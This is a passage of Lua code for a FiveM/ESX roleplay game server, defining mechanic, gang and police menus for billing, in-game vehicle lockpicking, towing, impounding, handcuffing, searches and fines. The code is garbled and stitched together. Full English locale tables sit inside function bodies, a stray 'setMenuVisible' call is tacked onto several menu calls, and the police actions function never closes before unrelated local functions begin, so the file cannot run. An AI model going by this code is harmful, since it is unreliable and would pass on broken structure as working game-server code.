			ESX.TriggerServerCallback('esx_skin:getPlayerSkin', function(skin, jobSkin)
				TriggerEvent('skinchanger:loadSkin', skin)
			end)

		elseif data.current.value == 'put_stock' then
			OpenPutStocksMenu()
		elseif data.current.value == 'get_stock' then
			OpenGetStocksMenuGang()
		elseif data.current.value == 'boss_actions' then
			TriggerEvent('esx_society:openBossMenu', 'mechanic', function(data, menu)
				menu.close()
			end, {wash = false, withdraw = false})
		end

	end, function(data, menu)
		menu.close()

		CurrentAction     = 'mechanic_actions_menu'
		CurrentActionMsg  = _U('open_actions')
		CurrentActionData = {}
	end) setMenuVisible(currentMenu, false)
end

function OpenMobileMechanicActionsMenu()
  Locales['en'] = {
  ['mechanic']                  = 'mechanic',
  ['drive_to_indicated']        = '~y~Drive~s~ to the indicated location.',
  ['mission_canceled']          = 'Mission ~r~canceled~s~',
  ['vehicle_list']              = 'vehicle List',
  ['work_wear']                 = 'workwear',
  ['civ_wear']                  = 'civilian clothes',
  ['deposit_stock']             = 'deposit Stock',
  ['withdraw_stock']            = 'withdraw Stock',
  ['boss_actions']              = 'boss Actions',
  ['service_vehicle']           = 'service Vehicle',
  ['flat_bed']                  = 'flatbed',
  ['tow_truck']                 = 'tow Truck',
  ['service_full']              = 'service full: ',
  ['open_actions']              = 'Press ~INPUT_CONTEXT~ to access the menu.',
  ['harvest']                   = 'harvest',
  ['harvest_menu']              = 'press ~INPUT_CONTEXT~ to access the harvest menu.',
  ['not_experienced_enough']    = 'you are not ~r~experienced enough~s~ to perform this action.',
  ['gas_can']                   = 'gas Can',
  ['repair_tools']              = 'repair Tools',
  ['body_work_tools']           = 'bodywork Tools',
  ['blowtorch']                 = 'blowtorch',
  ['repair_kit']                = 'repair Kit',
  ['body_kit']                  = 'body Kit',
  ['craft']                     = 'craft',
  ['craft_menu']                = 'press ~INPUT_CONTEXT~ to access the crafting menu.',
  ['billing']                   = 'billing',
  ['hijack']                    = 'hijack',
  ['repair']                    = 'repair',
  ['clean']                     = 'clean',
  ['imp_veh']                   = 'impound',
  ['place_objects']             = 'place Objects',
  ['invoice_amount']            = 'invoice Amount',
  ['amount_invalid']            = 'invalid amount',
  ['no_players_nearby']         = 'there is no nearby player',
  ['no_vehicle_nearby']         = 'there is no nearby vehicle',
  ['inside_vehicle']            = 'you can\'t do this from inside the vehicle!', 
  ['vehicle_unlocked']          = 'the vehicle has been ~g~unlocked',
  ['vehicle_repaired']          = 'the vehicle has been ~g~repaired',
  ['vehicle_cleaned']           = 'the vehicle has been ~g~cleaned',
  ['vehicle_impounded']         = 'the vehicle has been ~r~impounded',
  ['must_seat_driver']          = 'you must be in the driver seat!',
  ['must_near']                 = 'you must be ~r~near a vehicle~s~ to impound it.',
  ['vehicle_success_attached']  = 'vehicle successfully ~b~attached~s~',
  ['please_drop_off']           = 'please drop off the vehicle at the garage',
  ['cant_attach_own_tt']        = '~r~you can\'t~s~ attach own tow truck',
  ['no_veh_att']                = 'there is no ~r~vehicle~s~ to be attached',
  ['not_right_veh']             = 'this is not the right vehicle',
  ['veh_det_succ']              = 'vehicle successfully ~b~dettached~s~!',
  ['imp_flatbed']               = '~r~Action impossible!~s~ You need a ~b~Flatbed~s~ to load a vehicle',
  ['objects']                   = 'objects',
  ['roadcone']                  = 'roadcone',
  ['toolbox']                   = 'toolbox',
  ['mechanic_stock']            = 'mechanic Stock',
  ['quantity']                  = 'quantity',
  ['invalid_quantity']          = 'invalid quantity',
  ['inventory']                 = 'inventory',
  ['veh_unlocked']              = '~g~Vehicle Unlocked',
  ['hijack_failed']             = '~r~Hijack Failed',
  ['body_repaired']             = '~g~Body repaired',
  ['veh_repaired']              = '~g~Vehicle Repaired',
  ['veh_stored']                = 'press ~INPUT_CONTEXT~ to store the vehicle.',
  ['press_remove_obj']          = 'press ~INPUT_CONTEXT~ to remove the object',
  ['please_tow']                = 'please ~y~tow~s~ the vehicle',
  ['wait_five']                 = 'you must ~r~wait~s~ 5 mintes',
  ['must_in_flatbed']           = 'you must be in a flatbed to being the mission',
  ['mechanic_customer']         = 'mechanic Customer',
  ['you_do_not_room']           = '~r~You do not have more room',
  ['recovery_gas_can']          = '~b~Gas Can~s~ Retrieval...',
  ['recovery_repair_tools']     = '~b~Repair Tools~s~ Retrieval...',
  ['recovery_body_tools']       = '~b~Body Tools~s~ Retrieval...',
  ['not_enough_gas_can']        = 'You do not ~r~have enough~s~ gas cans.',
  ['assembling_blowtorch']      = 'Assembling ~b~Blowtorch~s~...',
  ['not_enough_repair_tools']   = 'You do not ~r~have enough~s~ repair tools.',
  ['assembling_repair_kit']     = 'Assembling ~b~Repair Kit~s~...',
  ['not_enough_body_tools']     = 'You do not ~r~have enough~s~ body tools.',
  ['assembling_body_kit']       = 'Assembling ~b~Body Kit~s~...',
  ['your_comp_earned']          = 'your company has ~g~earned~s~ ~g~$',
  ['you_used_blowtorch']        = 'you used a ~b~blowtorch',
  ['you_used_repair_kit']       = 'you used a ~b~Repair Kit',
  ['you_used_body_kit']         = 'you used a ~b~Body Kit',
  ['have_withdrawn']            = 'you have withdrawn ~y~x%s~s~ ~b~%s~s~',
  ['have_deposited']            = 'you have deposited ~y~x%s~s~ ~b~%s~s~',
  ['player_cannot_hold']        = 'you do ~r~not~s~ have enough ~y~free space~s~ in your inventory!',
}
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mobile_mechanic_actions', {
		title    = _U('mechanic'),
		align    = 'top-left',
		elements = {
			{label = _U('billing'),       value = 'billing'},
			{label = _U('hijack'),        value = 'hijack_vehicle'},
			{label = _U('repair'),        value = 'fix_vehicle'},
			{label = _U('clean'),         value = 'clean_vehicle'},
			{label = _U('imp_veh'),       value = 'del_vehicle'},
			{label = _U('flat_bed'),      value = 'dep_vehicle'},
			{label = _U('place_objects'), value = 'object_spawner'}
		}
	}, function(data, menu)
		if isBusy then return end

		if data.current.value == 'billing' then

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
				title = _U('invoice_amount')
			}, function(data, menu)
				local amount = tonumber(data.value)

				if amount == nil or amount < 0 then
					ESX.ShowNotification(_U('amount_invalid'))
				else
					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players_nearby'))
					else
						menu.close()
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_mechanic', _U('mechanic'), amount)
					end
				end
			end, function(data, menu)
				menu.close()
			end)

		elseif data.current.value == 'hijack_vehicle' then

		local playerPed = PlayerPedId()
		local vehicle   = ESX.Game.GetVehicleInDirection()
		local coords    = GetEntityCoords(playerPed)

		if IsPedSittingInAnyVehicle(playerPed) then
			ESX.ShowNotification(_U('inside_vehicle'))
			return
		end

		if DoesEntityExist(vehicle) then
			isBusy = true
			TaskStartScenarioInPlace(playerPed, 'WORLD_HUMAN_WELDING', 0, true)
			Citizen.CreateThread(function()
				Citizen.Wait(0)

				SetVehicleDoorsLocked(vehicle, 1)
				SetVehicleDoorsLockedForAllPlayers(vehicle, false)
				ClearPedTasksImmediately(playerPed)

				ESX.ShowNotification(_U('vehicle_unlocked'))
				isBusy = false
			end)
		else
			ESX.ShowNotification(_U('no_vehicle_nearby'))
		end

	elseif data.current.value == 'fix_vehicle' then

		local playerPed = PlayerPedId()
		local vehicle   = ESX.Game.GetVehicleInDirection()
		local coords    = GetEntityCoords(playerPed)

		if IsPedSittingInAnyVehicle(playerPed) then
			ESX.ShowNotification(_U('inside_vehicle'))
			return
		end

		if DoesEntityExist(vehicle) then
			isBusy = true
			TaskStartScenarioInPlace(playerPed, 'PROP_HUMAN_BUM_BIN', 0, true)
			Citizen.CreateThread(function()
				Citizen.Wait(10000)

				SetVehicleFixed(vehicle)
				SetVehicleDeformationFixed(vehicle)
				SetVehicleUndriveable(vehicle, false)
				SetVehicleEngineOn(vehicle, true, true)
				ClearPedTasksImmediately(playerPed)

    			TriggerServerEvent('lenzh_chopshop:updatevehparts', GetVehicleNumberPlateText(vehicle), 0)

				ESX.ShowNotification(_U('vehicle_repaired'))
				isBusy = false
			end)
		else
			ESX.ShowNotification(_U('no_vehicle_nearby'))
		end

	elseif data.current.value == 'clean_vehicle' then

		local playerPed = PlayerPedId()
		local vehicle   = ESX.Game.GetVehicleInDirection()
		local coords    = GetEntityCoords(playerPed)

		if IsPedSittingInAnyVehicle(playerPed) then
			ESX.ShowNotification(_U('inside_vehicle'))
			return
		end

		if DoesEntityExist(vehicle) then
			isBusy = true
			TaskStartScenarioInPlace(playerPed, 'WORLD_HUMAN_MAID_CLEAN', 0, true)
			Citizen.CreateThread(function()
				Citizen.Wait(10000)

				SetVehicleDirtLevel(vehicle, 0)
				ClearPedTasksImmediately(playerPed)

				ESX.ShowNotification(_U('vehicle_cleaned'))
				isBusy = false
			end)
		else
			ESX.ShowNotification(_U('no_vehicle_nearby'))
		end

	elseif data.current.value == 'del_vehicle' then

		local playerPed = PlayerPedId()

		if IsPedSittingInAnyVehicle(playerPed) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)

			if GetPedInVehicleSeat(vehicle, -1) == playerPed then
				ESX.ShowNotification(_U('vehicle_impounded'))
				ESX.Game.DeleteVehicle(vehicle)
	            SetVehicleHasBeenOwnedByPlayer(vehicle, false)
	            SetEntityAsMissionEntity(vehicle, false, false)
	            DeleteVehicle(vehicle)
			else
				ESX.ShowNotification(_U('must_seat_driver'))
			end
		else
			local vehicle = ESX.Game.GetVehicleInDirection()

			if DoesEntityExist(vehicle) then
				ESX.ShowNotification(_U('vehicle_impounded'))
				ESX.Game.DeleteVehicle(vehicle)
				SetVehicleHasBeenOwnedByPlayer(vehicle, false)
	            SetEntityAsMissionEntity(vehicle, false, false)
	            DeleteVehicle(vehicle)
			else
				ESX.ShowNotification(_U('must_near'))
			end
		end

	elseif data.current.value == 'dep_vehicle' then

		local playerPed = PlayerPedId()
		local vehicle = GetVehiclePedIsIn(playerPed, true)

		local towmodel = GetHashKey('flatbed3')
		local isVehicleTow = IsVehicleModel(vehicle, towmodel)

		if isVehicleTow then
			local targetVehicle = ESX.Game.GetVehicleInDirection()

			if CurrentlyTowedVehicle == nil then
				if targetVehicle ~= 0 then
					if not IsPedInAnyVehicle(playerPed, true) then
						if vehicle ~= targetVehicle then
							AttachEntityToEntity(targetVehicle, vehicle, 20, 0.75, 2.5, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 20, true)
							CurrentlyTowedVehicle = targetVehicle
							ESX.ShowNotification(_U('vehicle_success_attached'))

							if NPCOnJob then
								if NPCTargetTowable == targetVehicle then
									ESX.ShowNotification(_U('please_drop_off'))
									Config.Zones.VehicleDelivery.Type = 1

									if Blips['NPCTargetTowableZone'] then
										RemoveBlip(Blips['NPCTargetTowableZone'])
										Blips['NPCTargetTowableZone'] = nil
									end

									Blips['NPCDelivery'] = AddBlipForCoord(Config.Zones.VehicleDelivery.Pos.x, Config.Zones.VehicleDelivery.Pos.y, Config.Zones.VehicleDelivery.Pos.z)
									SetBlipRoute(Blips['NPCDelivery'], true)
								end
							end
						else
							ESX.ShowNotification(_U('cant_attach_own_tt'))
						end
					end
				else
					ESX.ShowNotification(_U('no_veh_att'))
				end
			else

				AttachEntityToEntity(CurrentlyTowedVehicle, vehicle, 20, -0.5, -12.0, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 20, true)
				DetachEntity(CurrentlyTowedVehicle, true, true)

				if NPCOnJob then
					if NPCTargetDeleterZone then

						if CurrentlyTowedVehicle == NPCTargetTowable then
							ESX.Game.DeleteVehicle(NPCTargetTowable)
							DeleteVehicle(vehicle)
							TriggerServerEvent('esx_mechanicjob:onNPCJobMissionCompleted')
							StopNPCJob()
							NPCTargetDeleterZone = false
						else
							ESX.ShowNotification(_U('not_right_veh'))
						end

					else
						ESX.ShowNotification(_U('not_right_place'))
					end
				end

				CurrentlyTowedVehicle = nil
				ESX.ShowNotification(_U('veh_det_succ'))

			end
		else
			ESX.ShowNotification(_U('imp_flatbed'))
		end

	elseif data.current.value == 'object_spawner' then

		local playerPed = PlayerPedId()

		if IsPedSittingInAnyVehicle(playerPed) then
			ESX.ShowNotification(_U('inside_vehicle'))
			return
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mobile_mechanic_actions_spawn', {
			title    = _U('objects'),
			align    = 'top-left',
			elements = {
				{label = _U('roadcone'), value = 'prop_roadcone02a'},
				{label = _U('toolbox'),  value = 'prop_toolchest_01'}
			}
		}, function(data2, menu2)
			local model   = data2.current.value
			local coords  = GetEntityCoords(playerPed)
			local forward = GetEntityForwardVector(playerPed)
			local x, y, z = table.unpack(coords + forward * 1.0)

			if model == 'prop_roadcone02a' then
				z = z - 2.0
			elseif model == 'prop_toolchest_01' then
				z = z - 2.0
			end

			ESX.Game.SpawnObject(model, {
				x = x,
				y = y,
				z = z
			}, function(obj)
				SetEntityHeading(obj, GetEntityHeading(playerPed))
				PlaceObjectOnGroundProperly(obj)
			end)

		end, function(data2, menu2)
			menu2.close()
		end)

	end

	end, function(data, menu)
		menu.close()
	end) setMenuVisible(currentMenu, false)
end

function OpenGangActionsMenu()

  ESX.UI.Menu.CloseAll()

  ESX.UI.Menu.Open(
    'default', GetCurrentResourceName(), 'gang_actions',
    {
      title    = 'Gang',
      align    = 'top-left',
      elements = {
        {label = _U('citizen_interaction'), value = 'citizen_interaction'},
        {label = _U('vehicle_interaction'), value = 'vehicle_interaction'},
        --{label = _U('object_spawner'),      value = 'object_spawner'},
      },
    },
    function(data, menu)

      if data.current.value == 'citizen_interaction' then

        ESX.UI.Menu.Open(
          'default', GetCurrentResourceName(), 'citizen_interaction',
          {
            title    = _U('citizen_interaction'),
            align    = 'top-left',
            elements = {
              {label = _U('id_card'),       value = 'identity_card'},
              {label = _U('search'),        value = 'body_search'},
              {label = _U('handcuff'),    value = 'handcuff'},
              {label = _U('drag'),      value = 'drag'},
              {label = _U('put_in_vehicle'),  value = 'put_in_vehicle'},
              {label = _U('out_the_vehicle'), value = 'out_the_vehicle'},
              {label = _U('fine'),            value = 'fine'}
            },
          },
          function(data2, menu2)

            local player, distance = ESX.Game.GetClosestPlayer()

            if distance ~= -1 and distance <= 3.0 then

              if data2.current.value == 'identity_card' then
                OpenIdentityCardMenu(player)
              end

              if data2.current.value == 'body_search' then
                OpenBodySearchMenu(player)
              end

              if data2.current.value == 'handcuff' then
                TriggerServerEvent('esx_gangjob:handcuff', GetPlayerServerId(player))
              end

              if data2.current.value == 'drag' then
                TriggerServerEvent('esx_gangjob:drag', GetPlayerServerId(player))
              end

              if data2.current.value == 'put_in_vehicle' then
                TriggerServerEvent('esx_gangjob:putInVehicle', GetPlayerServerId(player))
              end

              if data2.current.value == 'out_the_vehicle' then
                  TriggerServerEvent('esx_gangjob:OutVehicle', GetPlayerServerId(player))
              end

              if data2.current.value == 'fine' then
                OpenFineMenu(player)
              end

            else
              ESX.ShowNotification(_U('no_players_nearby'))
            end

          end,
          function(data2, menu2)
            menu2.close()
          end
        )

      end

      if data.current.value == 'vehicle_interaction' then

        ESX.UI.Menu.Open(
          'default', GetCurrentResourceName(), 'vehicle_interaction',
          {
            title    = _U('vehicle_interaction'),
            align    = 'top-left',
            elements = {
              {label = _U('vehicle_info'), value = 'vehicle_infos'},
              {label = _U('pick_lock'),    value = 'hijack_vehicle'},
            },
          },
          function(data2, menu2)

            local playerPed = GetPlayerPed(-1)
            local coords    = GetEntityCoords(playerPed)
            local vehicle   = GetClosestVehicle(coords.x,  coords.y,  coords.z,  3.0,  0,  71)

            if DoesEntityExist(vehicle) then

              local vehicleData = ESX.Game.GetVehicleProperties(vehicle)

              if data2.current.value == 'vehicle_infos' then
                OpenVehicleInfosMenu(vehicleData)
              end

              if data2.current.value == 'hijack_vehicle' then

                local playerPed = GetPlayerPed(-1)
                local coords    = GetEntityCoords(playerPed)

                if IsAnyVehicleNearPoint(coords.x, coords.y, coords.z, 3.0) then

                  local vehicle = GetClosestVehicle(coords.x,  coords.y,  coords.z,  3.0,  0,  71)

                  if DoesEntityExist(vehicle) then

                    Citizen.CreateThread(function()

                      TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_WELDING", 0, true)

                      Wait(20000)

                      ClearPedTasksImmediately(playerPed)

                      SetVehicleDoorsLocked(vehicle, 1)
                      SetVehicleDoorsLockedForAllPlayers(vehicle, false)

                      TriggerEvent('esx:showNotification', _U('vehicle_unlocked'))

                    end)

                  end

                end

              end

            else
              ESX.ShowNotification(_U('no_vehicles_nearby'))
            end

          end,
          function(data2, menu2)
            menu2.close()
          end
        )

      end

      if data.current.value == 'object_spawner' then

        ESX.UI.Menu.Open(
          'default', GetCurrentResourceName(), 'citizen_interaction',
          {
            title    = _U('traffic_interaction'),
            align    = 'top-left',
            elements = {
              {label = _U('cone'),     value = 'prop_roadcone02a'},
              {label = _U('barrier'), value = 'prop_barrier_work06a'},
              {label = _U('spikestrips'),    value = 'p_ld_stinger_s'},
              {label = _U('box'),   value = 'prop_boxpile_07d'},
              {label = _U('cash'),   value = 'hei_prop_cash_crate_half_full'}
            },
          },
          function(data2, menu2)


            local model     = data2.current.value
            local playerPed = GetPlayerPed(-1)
            local coords    = GetEntityCoords(playerPed)
            local forward   = GetEntityForwardVector(playerPed)
            local x, y, z   = table.unpack(coords + forward * 1.0)

            if model == 'prop_roadcone02a' then
              z = z - 2.0
            end

            ESX.Game.SpawnObject(model, {
              x = x,
              y = y,
              z = z
            }, function(obj)
              SetEntityHeading(obj, GetEntityHeading(playerPed))
              PlaceObjectOnGroundProperly(obj)
            end)

          end,
          function(data2, menu2)
            menu2.close()
          end
        )

      end

    end,
    function(data, menu)

      menu.close()

    end
  ) setMenuVisible(currentMenu, false)

end

function OpenPoliceActionsMenu()
Locales['en'] = {
  -- Cloakroom
  ['cloakroom'] = 'locker room',
  ['citizen_wear'] = 'civilian Outfit',
  ['police_wear'] = 'police Outfit',
  ['gilet_wear'] = 'orange reflective jacket',
  ['bullet_wear'] = 'bulletproof vest',
  ['no_outfit'] = 'there\'s no uniform that fits you!',
  ['open_cloackroom'] = 'press ~INPUT_CONTEXT~ to change ~y~clothes~s~.',
  -- Armory
  ['remove_object'] = 'withdraw object',
  ['deposit_object'] = 'deposit object',
  ['get_weapon'] = 'withdraw weapon from armory',
  ['put_weapon'] = 'store weapon in armory',
  ['buy_weapons'] = 'buy weapons',
  ['armory'] = 'armory',
  ['open_armory'] = 'press ~INPUT_CONTEXT~ to access the ~y~Armory~s~.',
  ['armory_owned'] = 'owned',
  ['armory_free'] = 'free',
  ['armory_item'] = '$%s',
  ['armory_weapontitle'] = 'armory - Buy weapon',
  ['armory_componenttitle'] = 'armory - Weapon attatchments',
  ['armory_bought'] = 'you bought an ~y~%s~s~ for ~r~$%s~s~',
  ['armory_money'] = 'you cannot afford that weapon',
  ['armory_hascomponent'] = 'you have that attatchment equiped!',
  ['get_weapon_menu'] = 'armory - Withdraw Weapon',
  ['put_weapon_menu'] = 'armory - Store Weapon',
  -- Vehicles
  ['vehicle_menu'] = 'vehicle',
  ['vehicle_blocked'] = 'all available spawn points are currently blocked!',
  ['garage_prompt'] = 'press ~INPUT_CONTEXT~ to access the ~y~Vehicle Actions~s~.',
  ['garage_title'] = 'vehicle Actions',
  ['garage_stored'] = 'stored',
  ['garage_notstored'] = 'not in garage',
  ['garage_storing'] = 'we\'re attempting to remove the vehicle, make sure no players are around it.',
  ['garage_has_stored'] = 'the vehicle has been stored in your garage',
  ['garage_has_notstored'] = 'no nearby owned vehicles were found',
  ['garage_notavailable'] = 'your vehicle is not stored in the garage.',
  ['garage_blocked'] = 'there\'s no available spawn points!',
  ['garage_empty'] = 'you dont have any vehicles in your garage.',
  ['garage_released'] = 'your vehicle has been released from the garage.',
  ['garage_store_nearby'] = 'there is no nearby vehicles.',
  ['garage_storeditem'] = 'open garage',
  ['garage_storeitem'] = 'store vehicle in garage',
  ['garage_buyitem'] = 'vehicle shop',
  ['helicopter_prompt'] = 'press ~INPUT_CONTEXT~ to access the ~y~Helicopter Actions~s~.',
  ['helicopter_notauthorized'] = 'you\'re not authorized to buy helicopters.',
  ['shop_item'] = '$%s',
  ['vehicleshop_title'] = 'vehicle Shop',
  ['vehicleshop_confirm'] = 'do you want to buy this vehicle?',
  ['vehicleshop_bought'] = 'you have bought ~y~%s~s~ for ~r~$%s~s~',
  ['vehicleshop_money'] = 'you cannot afford that vehicle',
  ['vehicleshop_awaiting_model'] = 'the vehicle is currently ~g~DOWNLOADING & LOADING~s~ please wait',
  ['confirm_no'] = 'no',
  ['confirm_yes'] = 'yes',
  -- Service
  ['service_max'] = 'you cannot enter service, max officers in service: %s/%s',
  ['service_not'] = 'you have not entered service! You\'ll have to get changed first.',
  ['service_anonunce'] = 'service information',
  ['service_in'] = 'you\'ve entered service, welcome!',
  ['service_in_announce'] = 'operator ~y~%s~s~ has entered service!',
  ['service_out'] = 'you have left service.',
  ['service_out_announce'] = 'operator ~y~%s~s~ has left their service.',
  -- Action Menu
  ['citizen_interaction'] = 'citizen Interaction',
  ['vehicle_interaction'] = 'vehicle Interaction',
  ['object_spawner'] = 'object Spawner',

  ['id_card'] = 'ID Card',
  ['search'] = 'search',
  ['handcuff'] = 'cuff / Uncuff',
  ['drag'] = 'escort',
  ['put_in_vehicle'] = 'put in Vehicle',
  ['out_the_vehicle'] = 'drag out from vehicle',
  ['fine'] = 'fine',
  ['unpaid_bills'] = 'manage unpaid bills',
  ['license_check'] = 'manage license',
  ['license_revoke'] = 'revoke license',
  ['license_revoked'] = 'your ~b~%s~s~ has been ~y~revoked~s~!',
  ['licence_you_revoked'] = 'you revoked a ~b~%s~s~ which belonged to ~y~%s~s~',
  ['no_players_nearby'] = 'there is no player(s) nearby!',
  ['being_searched'] = 'you are being ~y~searched~s~ by the ~b~Police~s~',
  -- Vehicle interaction
  ['vehicle_info'] = 'vehicle Info',
  ['pick_lock'] = 'lockpick Vehicle',
  ['vehicle_unlocked'] = 'vehicle ~g~Unlocked~s~',
  ['no_vehicles_nearby'] = 'there is no vehicles nearby',
  ['impound'] = 'impound vehicle',
  ['impound_prompt'] = 'press ~INPUT_CONTEXT~ to cancel the ~y~impound~s~',
  ['impound_canceled'] = 'you canceled the impound',
  ['impound_canceled_moved'] = 'the impound has been canceled because the vehicle moved',
  ['impound_successful'] = 'you have impounded the vehicle',
  ['search_database'] = 'vehicle information',
  ['search_database_title'] = 'vehicle information - search with registration number',
  ['search_database_error_invalid'] = 'that is ~r~not~s~ a ~y~valid~s~ registration number',
  ['search_database_error_not_found'] = 'that ~y~registration number~s~ is ~r~not~s~ registered to an vehicle!',
  ['search_database_found'] = 'the vehicle is ~y~registered~s~ to ~b~%s~s~',
  -- Traffic interaction
  ['traffic_interaction'] = 'interaction Traffic',
  ['cone'] = 'cone',
  ['barrier'] = 'barrier',
  ['spikestrips'] = 'spikestrips',
  ['box'] = 'box',
  ['cash'] = 'box of cash',
  -- ID Card Menu
  ['name'] = 'name: %s',
  ['job'] = 'job: %s',
  ['sex'] = 'sex: %s',
  ['dob'] = 'DOB: %s',
  ['height'] = 'height: %s',
  ['id'] = 'ID: %s',
  ['bac'] = 'BAC: %s',
  ['unknown'] = 'unknown',
  ['male'] = 'male',
  ['female'] = 'female',
  -- Body Search Menu
  ['guns_label'] = '--- Guns ---',
  ['inventory_label'] = '--- Inventory ---',
  ['license_label'] = ' --- Licenses ---',
  ['confiscate'] = 'confiscate %s',
  ['confiscate_weapon'] = 'confiscate %s with %s bullets',
  ['confiscate_inv'] = 'confiscate %sx %s',
  ['confiscate_dirty'] = 'confiscate dirty money: <span style="color:red;">$%s</span>',
  ['you_confiscated'] = 'you confiscated ~y~%sx~s~ ~b~%s~s~ from ~b~%s~s~',
  ['got_confiscated'] = '~y~%sx~s~ ~b~%s~s~ were confiscated by ~y~%s~s~',
  ['you_confiscated_account'] = 'you confiscated ~g~$%s~s~ (%s) from ~b~%s~s~',
  ['got_confiscated_account'] = '~g~$%s~s~ (%s) was confiscated by ~y~%s~s~',
  ['you_confiscated_weapon'] = 'you confiscated ~b~%s~s~ from ~b~%s~s~ with ~o~%s~s~ bullets',
  ['got_confiscated_weapon'] = 'your ~b~%s~s~ with ~o~%s~s~ bullets was confiscated by ~y~%s~s~',
  ['traffic_offense'] = 'traffic Offense',
  ['minor_offense'] = 'minor Offense',
  ['average_offense'] = 'average Offense',
  ['major_offense'] = 'major Offense',
  ['fine_total'] = 'fine: %s',
  -- Vehicle Info Menu
  ['plate'] = 'plate: %s',
  ['owner_unknown'] = 'owner: Unknown',
  ['owner'] = 'owner: %s',
  -- Boss Menu
  ['open_bossmenu'] = 'press ~INPUT_CONTEXT~ to open the menu',
  ['quantity_invalid'] = 'invalid quantity',
  ['have_withdrawn'] = 'you have withdrawn ~y~%sx~s~ ~b~%s~s~',
  ['have_deposited'] = 'you have deposited ~y~%sx~s~ ~b~%s~s~',
  ['quantity'] = 'quantity',
  ['inventory'] = 'inventory',
  ['police_stock'] = 'police Stock',
  -- Misc
  ['remove_prop'] = 'press ~INPUT_CONTEXT~ to delete the object',
  ['map_blip'] = 'police Station',
  ['unrestrained_timer'] = 'you feel your handcuffs slowly losing grip and fading away.',
  -- Notifications
  ['alert_police'] = 'police alert',
  ['phone_police'] = 'police',
}
local function OpenBodySearchMenu(player)

	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)

		local elements = {}

		for i=1, #data.accounts, 1 do

			if data.accounts[i].name == 'black_money' and data.accounts[i].money > 0 then

				table.insert(elements, {
					label    = _U('confiscate_dirty', ESX.Math.Round(data.accounts[i].money)),
					value    = 'black_money',
					itemType = 'item_account',
					amount   = data.accounts[i].money
				})

				break
			end

		end

		table.insert(elements, {label = _U('guns_label'), value = nil})

		for i=1, #data.weapons, 1 do
			table.insert(elements, {
				label    = _U('confiscate_weapon', ESX.GetWeaponLabel(data.weapons[i].name), data.weapons[i].ammo),
				value    = data.weapons[i].name,
				itemType = 'item_weapon',
				amount   = data.weapons[i].ammo
			})
		end

		table.insert(elements, {label = _U('inventory_label'), value = nil})

		for i=1, #data.inventory, 1 do
			if data.inventory[i].count > 0 then
				table.insert(elements, {
					label    = _U('confiscate_inv', data.inventory[i].count, data.inventory[i].label),
					value    = data.inventory[i].name,
					itemType = 'item_standard',
					amount   = data.inventory[i].count
				})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'body_search',
		{
			title    = _U('search'),
			align    = 'top-left',
			elements = elements,
		},
		function(data, menu)

			local itemType = data.current.itemType
			local itemName = data.current.value
			local amount   = data.current.amount

			if data.current.value ~= nil then
				TriggerServerEvent('esx_policejob:confiscatePlayerItem', GetPlayerServerId(player), itemType, itemName, amount)
				OpenBodySearchMenu(player)
			end

		end, function(data, menu)
			menu.close()
		end)

	end, GetPlayerServerId(player))

end

local function OpenFineMenu(player)

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fine',
	{
		title    = _U('fine'),
		align    = 'top-left',
		elements = {
			{label = _U('traffic_offense'), value = 0},
			{label = _U('minor_offense'),   value = 1},
			{label = _U('average_offense'), value = 2},
			{label = _U('major_offense'),   value = 3}
		}
	}, function(data, menu)
		OpenFineCategoryMenu(player, data.current.value)
	end, function(data, menu)
		menu.close()
	end)

end

local function OpenFineCategoryMenu(player, category)

	ESX.TriggerServerCallback('esx_policejob:getFineList', function(fines)

		local elements = {}

		for i=1, #fines, 1 do
			table.insert(elements, {
				label     = fines[i].label .. ' <span style="color: green;">$' .. fines[i].amount .. '</span>',
				value     = fines[i].id,
				amount    = fines[i].amount,
				fineLabel = fines[i].label
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fine_category',
		{
			title    = _U('fine'),
			align    = 'top-left',
			elements = elements,
		}, function(data, menu)

			local label  = data.current.fineLabel
			local amount = data.current.amount

			menu.close()

			if Config.EnablePlayerManagement then
				TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(player), 'society_police', _U('fine_total', label), amount)
			else
				TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(player), '', _U('fine_total', label), amount)
			end

			ESX.SetTimeout(300, function()
				OpenFineCategoryMenu(player, category)
			end)

		end, function(data, menu)
			menu.close()
		end)

	end, category)

end

local function OpenIdentityCardMenu(player)

	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)

		local elements    = {}
		local nameLabel   = _U('name', data.name)
		local jobLabel    = nil
		local sexLabel    = nil
		local dobLabel    = nil
		local heightLabel = nil
		local idLabel     = nil
	
		if data.job.grade_label ~= nil and  data.job.grade_label ~= '' then
			jobLabel = _U('job', data.job.label .. ' - ' .. data.job.grade_label)
		else
			jobLabel = _U('job', data.job.label)
		end
	
		if Config.EnableESXIdentity then
	
			nameLabel = _U('name', data.firstname .. ' ' .. data.lastname)
	
			if data.sex ~= nil then
				if string.lower(data.sex) == 'm' then
					sexLabel = _U('sex', _U('male'))
				else
					sexLabel = _U('sex', _U('female'))
				end
			else
				sexLabel = _U('sex', _U('unknown'))
			end
	
			if data.dob ~= nil then
				dobLabel = _U('dob', data.dob)
			else
				dobLabel = _U('dob', _U('unknown'))
			end
	
			if data.height ~= nil then
				heightLabel = _U('height', data.height)
			else
				heightLabel = _U('height', _U('unknown'))
			end
	
			if data.name ~= nil then
				idLabel = _U('id', data.name)
			else
				idLabel = _U('id', _U('unknown'))
			end
	
		end
	
		local elements = {
			{label = nameLabel, value = nil},
			{label = jobLabel,  value = nil},
		}
	
		if Config.EnableESXIdentity then
			table.insert(elements, {label = sexLabel, value = nil})
			table.insert(elements, {label = dobLabel, value = nil})
			table.insert(elements, {label = heightLabel, value = nil})
